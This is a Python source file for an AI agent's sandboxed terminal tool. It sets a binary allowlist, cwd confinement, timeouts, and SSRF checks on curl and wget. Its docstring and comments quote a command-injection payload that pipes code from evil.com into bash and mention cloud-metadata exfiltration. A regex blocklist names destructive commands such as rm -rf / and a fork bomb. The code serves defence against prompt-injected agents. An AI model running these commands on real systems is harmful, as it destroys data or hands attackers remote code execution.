"""Terminal tool — runs shell commands inside the workspace sandbox.

Security model (v4 hardening):
  * Commands are parsed with shlex and the first token (binary) is checked
    against an allowlist. Substring denylists are trivially bypassable
    (extra whitespace, shell escapes, alternative utilities) so we don't
    rely on them for safety.
  * The cwd is resolved and verified to stay inside `workspace_root` via
    Path.is_relative_to() — symlinks that escape the workspace are rejected.
  * Timeouts are clamped to [1, 300] seconds to prevent resource abuse.
  * Subprocesses are started in a new session (start_new_session=True) so
    that timeout kills propagate to child processes too (via os.killpg).
  * Output is streamed and capped at 64 KB to prevent memory exhaustion.

v5 security hardening:
  * The `shell=True` mode has been REMOVED. It was LLM-controllable via
    tool parameters and bypassed the binary allowlist entirely — the
    check only inspected tokens[0], so payloads like
    `ls; curl http://evil.com | bash` passed (binary=ls) and were then
    executed by /bin/sh -c, giving full RCE. If the agent needs pipes
    or redirects, it must compose them via separate tool calls or use
    python_exec with subprocess.run([...]) inside the AST sandbox.
  * The `shell` parameter is still accepted (for backward compat with
    old system prompts) but is now IGNORED and logs a warning.
"""
from __future__ import annotations

import asyncio
import logging
import os
import shlex
import time
from pathlib import Path
from typing import Any

from adonai.core.interfaces import Tool
from adonai.core.models import ToolResult

log = logging.getLogger(__name__)

# Default allowlist of binaries the agent may invoke. Sites may override
# via TerminalTool(allowed_binaries=[...]). Keep this conservative — every
# entry is a potential prompt-injection target.
_DEFAULT_ALLOWED_BINARIES = {
    # read-only inspection
    "ls", "cat", "head", "tail", "wc", "file", "stat", "du", "df",
    "find", "tree", "grep", "rg", "ag", "sed", "awk", "cut", "sort", "uniq",
    "tr", "tee", "diff", "comm", "md5sum", "sha256sum", "xxd", "hexdump",
    "which", "whereis", "type", "alias", "env", "printenv",
    # shell builtins (commonly needed, low-risk)
    "echo", "printf", "true", "false", "test", "pwd",
    "xargs", "seq", "basename", "dirname", "realpath", "readlink",
    "date", "cal", "uptime", "whoami", "hostname", "uname", "id",
    # file ops inside workspace
    "mkdir", "touch", "cp", "mv", "ln", "chmod", "chown", "rm",
    # dev tooling
    "git", "pip", "pip3", "pytest", "ruff", "black",
    "mypy", "pylint", "flake8", "isort", "node", "npm", "npx", "yarn",
    "pnpm", "tsc", "eslint", "prettier", "cargo", "go", "rustc", "gcc", "g++",
    "make", "cmake", "mvn", "gradle", "java", "javac", "dotnet",
    # network (read-only)
    "curl", "wget", "httpie", "jq", "yq",
    # text editors (non-interactive)
    "sed", "ed",
}

# Hard blocklist — these are always rejected regardless of allowlist.
# v9: compiled as case-insensitive regex with word boundaries so that
# `PYTHON3 -c '…'`, `python3\t-c`, `rm  -rf  /` (double space), and
# `rm -r -f /` (split flags) don't bypass the check. The binary-allowlist
# on tokens[0] is the real defense; this list is defense-in-depth.
import re as _re
_HARD_BLOCKED_PATTERNS = (
    # v9: catch `rm -rf /`, `rm  -rf  /`, `rm -r -f /`, `rm -fr /`, etc.
    # Match: rm, then any combination of -r/-f/-rf/-fr flags (possibly
    # separated by spaces), then a target of `/`, `*`, or `~`.
    _re.compile(r"\brm\s+(-[a-zA-Z]*\s*)*[-]*[rf][a-zA-Z]*\s+(/\*|/|~|\*)", _re.IGNORECASE),
    _re.compile(r"\bmkfs\b", _re.IGNORECASE),
    _re.compile(r"\bdd\s+if=/dev/zero\s+of=/dev/", _re.IGNORECASE),
    _re.compile(r"\b(shutdown|reboot|halt|poweroff)\b", _re.IGNORECASE),
    _re.compile(r"\binit\s+[06]\b", _re.IGNORECASE),
    _re.compile(r":\(\)\s*\{\s*:\s*\|\s*:&\s*\}\s*;:", _re.IGNORECASE),  # fork bomb
    _re.compile(r">\s*/dev/(sd|nvme|hd)", _re.IGNORECASE),
    _re.compile(r"\bchmod\s+-R\s+000\s+/", _re.IGNORECASE),
    _re.compile(r"\bchown\s+-R\b", _re.IGNORECASE),
    _re.compile(r"\bpython3?\s+(-c|--command)\b", _re.IGNORECASE),  # block inline code
    _re.compile(r"\bpip3?\s+install\b", _re.IGNORECASE),  # block package installs
    # v5: block shell metacharacters that would let an attacker chain
    # commands past the binary-allowlist check on the first token.
    # These are checked on the raw command (not tokens) because shlex
    # would interpret them.
    _re.compile(r";|\||&&|\|\||\$\(|`|>>?", _re.IGNORECASE),
)

# Legacy tuple kept for backward-compat with code that reads _HARD_BLOCKED.
_HARD_BLOCKED = (
    "rm -rf /", "rm -rf /*", "rm -rf .", "rm -rf *", "rm -rf ~",
    "mkfs", "dd if=/dev/zero of=/dev/",
    "shutdown", "reboot", "halt", "poweroff", "init 0", "init 6",
    ":(){:|:&};:",
    "> /dev/sda", "> /dev/nvme", "> /dev/hd",
    "chmod -R 000 /", "chown -R",
    "python ", "python3 ",
    "pip install", "pip3 install",
    "; ", " | ", " &&", " ||", "& ", "$(", "`", "> ", " >>",
)


class TerminalTool(Tool):
    name = "terminal"
    description = (
        "Execute a shell command in the workspace sandbox. "
        "Returns combined stdout+stderr (≤64 KB) and exit code. "
        "30-second default timeout (max 300s). "
        "Commands are parsed with shlex and the binary must be in the allowlist. "
        "Shell metacharacters (; | && || $() `) are rejected — compose multi-step "
        "commands via separate tool calls instead."
    )
    parameters = {
        "type": "object",
        "properties": {
            "command": {"type": "string", "description": "Shell command to execute. Must be a single command — no pipes, redirects, or shell chaining."},
            "timeout": {"type": "integer", "default": 30, "description": "Max seconds (1-300)."},
            "cwd": {"type": "string", "default": "", "description": "Subdir of workspace_root."},
            # `shell` is accepted for backward compat with old prompts but
            # is now IGNORED. The shell=True path was a one-step RCE
            # primitive (binary check only inspected tokens[0]).
            "shell": {"type": "boolean", "default": False,
                       "description": "(Deprecated, ignored) Previously enabled /bin/sh -c mode. "
                                      "Removed in v5 because it allowed command injection."},
        },
        "required": ["command"],
    }
    risk_level = "high"
    requires_approval = True
    tags = ["shell", "execution"]
    category = "system"

    def __init__(
        self,
        forbidden: list[str] | None = None,
        workspace_root: str | None = None,
        allowed_binaries: set[str] | None = None,
    ) -> None:
        # `forbidden` kept for backward-compat but merged into _HARD_BLOCKED.
        self._forbidden = tuple(forbidden) if forbidden else _HARD_BLOCKED
        self._workspace_root = Path(workspace_root).resolve() if workspace_root else None
        self._allowed_binaries = allowed_binaries or _DEFAULT_ALLOWED_BINARIES

    async def execute(self, **params: Any) -> ToolResult:
        start = time.time()
        call_id = f"term_{int(start * 1000)}"
        cmd = (params.get("command") or "").strip()
        if not cmd:
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error="command is required", duration_s=0.0)

        # v5: if the caller passed shell=True, log a deprecation warning and
        # continue with the safe (non-shell) execution path. The shell=True
        # path was a one-step RCE primitive and has been removed.
        if params.get("shell"):
            log.warning(
                "TerminalTool: 'shell' parameter is deprecated and ignored "
                "(removed in v5 for security). Command will run without /bin/sh. "
                "If you need pipes/redirects, compose them via separate tool calls "
                "or use python_exec. Command was: %r",
                cmd,
            )

        # Defense-in-depth: hard blocklist on raw command.
        # v9: use compiled regex patterns with case-insensitive flag and
        # word boundaries so that `PYTHON3 -c '…'`, `python3\t-c`, `rm  -rf  /`
        # (double space), and `rm -r -f /` (split flags) don't bypass the
        # check. The binary-allowlist on tokens[0] is the real defense;
        # this list is defense-in-depth.
        for pat in _HARD_BLOCKED_PATTERNS:
            m = pat.search(cmd)
            if m:
                log.warning("TerminalTool rejected blocked pattern %r in command: %r",
                            m.group(), cmd)
                return ToolResult(call_id=call_id, tool=self.name, success=False,
                                  error=f"forbidden command pattern: {m.group()!r}",
                                  duration_s=time.time() - start)
        # Legacy substring check (kept for backward-compat with custom
        # forbidden lists passed via the constructor).
        for bad in self._forbidden:
            if bad in cmd:
                log.warning("TerminalTool rejected blocked pattern %r in command: %r", bad, cmd)
                return ToolResult(call_id=call_id, tool=self.name, success=False,
                                  error=f"forbidden command pattern: {bad!r}",
                                  duration_s=time.time() - start)

        # Clamp timeout to [1, 300].
        try:
            timeout = max(1, min(300, int(params.get("timeout", 30))))
        except (TypeError, ValueError):
            timeout = 30

        # Resolve cwd and verify it stays inside workspace_root.
        cwd = None
        if self._workspace_root:
            cwd_param = params.get("cwd") or ""
            if cwd_param:
                cwd = (self._workspace_root / cwd_param).resolve()
                try:
                    cwd.relative_to(self._workspace_root)
                except ValueError:
                    return ToolResult(call_id=call_id, tool=self.name, success=False,
                                      error=f"cwd {cwd_param!r} escapes workspace sandbox",
                                      duration_s=time.time() - start)
            else:
                cwd = self._workspace_root

        # Binary allowlist check (applies to first token of the command).
        try:
            tokens = shlex.split(cmd, posix=True)
        except ValueError as e:
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error=f"shlex parse error: {e}", duration_s=time.time() - start)
        if not tokens:
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error="empty command after parse", duration_s=time.time() - start)
        binary = os.path.basename(tokens[0])
        if binary not in self._allowed_binaries:
            log.warning("TerminalTool rejected non-allowlisted binary %r in command: %r", binary, cmd)
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error=(f"binary {binary!r} not in allowlist. "
                                     f"Allowed: {sorted(self._allowed_binaries)[:20]}… "
                                     f"(contact an admin to extend the allowlist)"),
                              duration_s=time.time() - start)

        # v7: Route curl/wget through UrlSafetyPolicy so terminal network
        # egress is subject to the same SSRF defenses as http_request /
        # web_fetch. Previously `terminal curl http://169.254.169.254/...`
        # would bypass the URL safety policy entirely (cloud metadata
        # exfiltration, internal host scanning, etc.).
        # v9 SECURITY FIX: Previously failed OPEN on ImportError of url_safety
        # — if the module was renamed/moved/broken, terminal SSRF protection
        # would silently disappear. Now fails CLOSED.
        if binary in ("curl", "wget"):
            url = self._extract_url_from_tokens(tokens)
            if url:
                try:
                    from adonai.tools.url_safety import DEFAULT_POLICY
                    ok, reason = DEFAULT_POLICY.validate(url)
                    if not ok:
                        log.warning(
                            "TerminalTool: %s URL rejected by safety policy: %s "
                            "(url=%s)", binary, reason, url[:120],
                        )
                        return ToolResult(
                            call_id=call_id, tool=self.name, success=False,
                            error=(f"{binary} URL rejected by safety policy: {reason}"),
                            duration_s=time.time() - start,
                        )
                except ImportError:
                    # v9: fail CLOSED — if url_safety is unavailable, block
                    # the curl/wget entirely. Previously this passed (allow),
                    # creating a silent SSRF bypass when the module was broken.
                    log.error(
                        "TerminalTool: url_safety module unavailable — "
                        "blocking %s command to prevent SSRF bypass", binary,
                    )
                    return ToolResult(
                        call_id=call_id, tool=self.name, success=False,
                        error=(f"{binary} blocked: url_safety module unavailable "
                               f"(fail-closed to prevent SSRF bypass)"),
                        duration_s=time.time() - start,
                    )
                except Exception as e:
                    # Any other exception in URL validation — also fail closed.
                    log.error(
                        "TerminalTool: URL validation error for %s — "
                        "blocking to prevent SSRF bypass: %s", binary, e,
                    )
                    return ToolResult(
                        call_id=call_id, tool=self.name, success=False,
                        error=(f"{binary} blocked: URL validation error: {e}"),
                        duration_s=time.time() - start,
                    )

        # Spawn — ALWAYS via create_subprocess_exec (never shell).
        # The shell=True path was removed in v5 because the binary-allowlist
        # check only inspected tokens[0], making `ls; curl evil | bash` pass.
        try:
            proc = await asyncio.create_subprocess_exec(
                *tokens,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                cwd=str(cwd) if cwd else None,
                start_new_session=True,
            )
        except Exception as e:
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error=f"spawn failed: {type(e).__name__}: {e}",
                              duration_s=time.time() - start)

        # Wait with timeout. On timeout, kill the entire process group.
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except (ProcessLookupError, PermissionError, OSError):
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass
            return ToolResult(call_id=call_id, tool=self.name, success=False,
                              error=f"timeout after {timeout}s (process group killed)",
                              duration_s=time.time() - start)

        text = (stdout or b"").decode("utf-8", errors="replace")
        if len(text) > 65_536:
            text = text[:65_536] + "\n…(truncated)"
        return ToolResult(
            call_id=call_id, tool=self.name,
            success=(proc.returncode == 0),
            output={"stdout": text, "exit_code": proc.returncode, "command": cmd},
            error=None if proc.returncode == 0 else f"exit code {proc.returncode}",
            duration_s=time.time() - start,
        )

    @staticmethod
    def _extract_url_from_tokens(tokens: list[str]) -> str | None:
        """Extract the first URL argument from a curl/wget token list.

        curl/wget accept URLs as positional args or via -L/--location etc.
        We scan for the first token that looks like a URL (starts with
        http://, https://, or ftp://). Returns None if no URL is found.
        """
        for tok in tokens[1:]:  # skip the binary name
            if not tok:
                continue
            tok_lower = tok.lower()
            if tok_lower.startswith(("http://", "https://", "ftp://")):
                return tok
            # curl also accepts bare hostnames — but those are ambiguous
            # (could be a filename), so we only validate full URLs.
        return None
